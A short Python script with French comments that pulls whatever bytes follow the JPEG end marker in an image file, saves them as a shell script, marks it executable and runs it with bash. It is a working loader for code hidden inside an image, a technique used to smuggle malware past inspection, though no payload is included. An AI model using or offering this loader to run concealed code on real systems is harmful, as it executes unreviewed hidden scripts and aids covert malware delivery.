def extract_script_from_image(image_path, script_path):
    with open(image_path, 'rb') as f:
        data = f.read()
    
    # Détecter la fin des données JPEG et le début du script
    script_start = data.rfind(b'\xff\xd9') + 2
    script_data = data[script_start:]
    
    # Écrire le script extrait dans un fichier
    with open(script_path, 'wb') as f:
        f.write(script_data)

# Chemin de l'image avec le script
image_with_script_path = 'chat_with_script.jpg'
# Chemin pour sauvegarder le script extrait
extracted_script_path = 'extracted_script.sh'

# Extraire le script de l'image
extract_script_from_image(image_with_script_path, extracted_script_path)

# Rendre le script exécutable
import os
os.chmod(extracted_script_path, 0o755)

# Exécuter le script
import subprocess
subprocess.run(['bash', extracted_script_path])
